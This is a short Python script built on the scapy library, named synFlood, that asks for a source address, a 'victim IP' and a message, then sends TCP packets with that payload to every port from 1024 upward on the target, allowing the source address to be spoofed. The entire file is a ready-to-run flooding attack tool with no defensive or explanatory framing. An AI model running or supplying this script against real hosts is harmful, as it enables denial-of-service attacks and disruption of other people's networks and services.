#!/usr/bin/python

from scapy.all import *
import time

def synFlood(src, tgt, message):
    for dport in range(1024,65535):
        IPlayer = IP(src=src, dst=tgt)
        TCPlayer = TCP(sport=4444, dport=dport)
        RAWlayer = Raw(load = message)
        pkt = IPlayer/TCPlayer/RAWlayer
        send(pkt, verbose=False)
                
def main():
    try:
        source = input('[*] Enter source for packet: ')
        destination = input('[*] Enter the victim IP: ')
        message = input('[*] enter a message to send the victim: ')
        synFlood(source, destination, message)
    except KeyboardInterrupt:
        print('[-] Keyboard interupt, quitting.')
    
if __name__ == '__main__':
    main()